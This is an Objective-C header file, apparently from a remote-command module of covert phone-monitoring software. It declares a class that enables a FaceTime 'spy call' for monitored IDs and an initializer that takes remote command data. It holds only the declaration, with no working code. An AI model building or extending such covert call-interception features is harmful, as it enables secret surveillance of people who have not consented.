//
//  EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor.h
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/21/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "RemoteCmdSyncProcessor.h"


@interface EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor : RemoteCmdSyncProcessor {

}


//Initialize Processor with RemoteCommandData 
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData; 

@end
